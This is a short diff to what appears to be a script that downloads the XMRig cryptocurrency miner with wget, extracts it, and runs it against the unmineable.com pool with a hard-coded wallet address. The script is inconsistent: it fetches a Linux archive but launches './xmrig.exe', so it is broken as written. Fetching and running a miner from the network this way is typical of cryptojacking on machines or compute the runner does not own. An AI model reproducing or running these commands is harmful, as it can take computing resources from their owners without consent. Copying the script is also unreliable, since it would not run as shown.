@@ -1,3 +1,3 @@
-https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-x64.tar.gz 
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-x64.tar.gz 
 tar xf xmrig-6.16.2-linux-x64.tar.gz
 ./xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u MANA:0x8d635d946ff67d4095bb8d81b51795bfa0fdcdef.KAKA -p x
